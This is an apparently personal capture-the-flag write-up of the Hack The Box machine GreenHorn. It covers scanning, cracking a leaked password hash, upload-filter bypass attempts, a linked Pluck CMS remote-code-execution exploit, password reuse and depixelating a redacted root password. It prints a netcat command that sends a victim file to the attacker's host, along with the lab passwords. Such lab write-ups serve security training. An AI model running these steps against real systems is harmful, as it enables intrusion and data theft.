This was an easy box but took me longer than expected to crack.

Started off with an NMAP scan

```diff
nmap -p- -A -T4 10.10.11.25

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://greenhorn.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=62f2fcf1176f2db0; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=97S-jdG8v4soGuIvlAtrVnm-RCw6MTcyMjI3NDAzNDYwOTMxMDQ2Nw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 29 Jul 2024 17:27:14 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>GreenHorn</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=6dc3dd530f506673; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=Aiz2dT_8egztQ4XLhngm2kmm3W46MTcyMjI3NDA0MTAwMDgxMzI3OQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 29 Jul 2024 17:27:21 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=7/29%Time=66A7D0F2%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,1530,"HTTP/1\.0\x20200\x20OK\r\nCache-Contr
SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
SF:ea=62f2fcf1176f2db0;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
SF:kie:\x20_csrf=97S-jdG8v4soGuIvlAtrVnm-RCw6MTcyMjI3NDAzNDYwOTMxMDQ2Nw;\x
SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2029\x20Jul\x202024\x2017:27:14\x
SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"the
SF:me-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\">\n\t<title>GreenHorn</title>\n\t<link\x
SF:20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR
SF:3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6
SF:Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmh
SF:vcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLC
SF:JzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvY
SF:X")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(HTTPOptions,1BD,"HTTP/1\.0\x20405\x20Method\x20Not\x20All
SF:owed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nAllow:\x20
SF:HEAD\r\nAllow:\x20GET\r\nCache-Control:\x20max-age=0,\x20private,\x20mu
SF:st-revalidate,\x20no-transform\r\nSet-Cookie:\x20i_like_gitea=6dc3dd530
SF:f506673;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csr
SF:f=Aiz2dT_8egztQ4XLhngm2kmm3W46MTcyMjI3NDA0MTAwMDgxMzI3OQ;\x20Path=/;\x2
SF:0Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAM
SF:EORIGIN\r\nDate:\x20Mon,\x2029\x20Jul\x202024\x2017:27:21\x20GMT\r\nCon
SF:tent-Length:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnectio
SF:n:\x20close\r\n\r\n400\x20Bad\x20Request");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=7/29%OT=22%CT=1%CU=44223%PV=Y%DS=2%DC=T%G=Y%TM=66A7
OS:D161%P=x86_64-pc-linux-gnu)SEQ(SP=F8%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)S
OS:EQ(SP=F8%GCD=2%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST1
OS:1NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE
OS:88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5
OS:3CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4
OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%
OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%R
OS:ID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   164.65 ms 10.10.14.1
2   165.29 ms 10.10.11.25

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1984.66 seconds
```
Firstly add the IP of the box to /etc/hosts and map it to greenhorn.htb

Now, There are two ports hosting websites, port 80 and 3000. I initially focused on the main port and navigated to http://greenhorn.htb. It is hosting a Pluck CMS (version: 4.7.18). Upon further exploring this site, we find two endpoints login.php and admin.php. I tried to access admin.php but was redirected to login.php asking to log in. I hit a road block here.

So, now lets focus on http://greenhorn.htb:3000. It is hosting Gitea, a DevOps platform. Further exploring the site we can find GreenAdmin/GreenHorn with all the source code of the main website. We can find the source code of admin.php and login.php, how the login is handled using cookies and other technologies. 

In the login.php page we can find a placeholder $ww for password and we can also see that SHA512 hashing is used for passwords. Further exploring the directory we find a pass.php in data/settings path. We can find the SHA512 hash og the password.

After dehashing the obtained hash we get a password "iloveyou1". Now try to login at login.php with this password and you will be given access to admin.php. Which is used to manage the whole website. 

Now in the admin portal there is a way to upload files. I tried to exploit this to gain RCE by uploading a PHP reverse shell. But sadly the website has measure to counter this. If the file extension has commonly used php extensions in it then it is appended with a .txt extension, nullifying the .php extension. I tried to proceed by adding a null byte(%00 and 0x00) to the end of the .php extension. Now the file is getting uploaded without a .txt file extension but still the file cannot be executed on the server side, everytime I try to run the file by clicking on it, it prompts a download. 
![alt text](/assets/image1.png)

After many more failed attempts, I turned to exploitDB and luckily Pluck(version: 4.7.18) is vulnerable to RCE as I expected but to exploit this we had to upload a .zip file with the reverse shell in it rather than directly uploading the reverse shell. I used the the exploit posted on exploitDB (https://www.exploit-db.com/exploits/51592) and Bingo!! Got a shell. 
![alt text](/assets/image.png)
![alt text](/assets/image2.png)

Now off to user.txt. Navigating to /home/junior I found the user.txt with another PDF file, "Using OpenVAS.pdf". When I tried to cat the user.txt, I got a permission denied error. Only root and junior had permission to access both these files. Now this is where I got stuck for a long time. I tried a variety of privilege escalation methodologies with no success. I was frustrated and I just randomly thought of using the previously obtained password "iloveyou1" as junior's password, it worked T.T.
![alt text](/assets/image3.png)


Now I wanted to read the contents of the PDF. But I had no provisions to do so on the shell so I thought of using netcat to transfer it to my host machine where I could analyse it. 

Syntax for File transfer on the shell(sender)
```diff
nc -w 3 10.10.14.109 12345 < 'Using OpenVAS.pdf'

```
Syntax for File transfer on the host(receiver)
```diff
nc -lp 12345 > output.pdf
```

Analysing the PDF we can see that there is a password for root mention in the file but it is pixelated. I tried out many online tools to dipixelate the pdf but none worked. Then came across a tool named Depix(https://github.com/spipm/Depix) from a blog online. 
![alt text](/assets/image4.png)

To use Depix let's first convert the pdf to an image
```diff
pdfimages output.pdf pix
```

Now to use Depix
![alt text](/assets/image5.png)
![alt text](/assets/image6.png)

The password for root is "sidefromsidetheothersidesidefromsidetheotherside"
![alt text](/assets/image7.png)
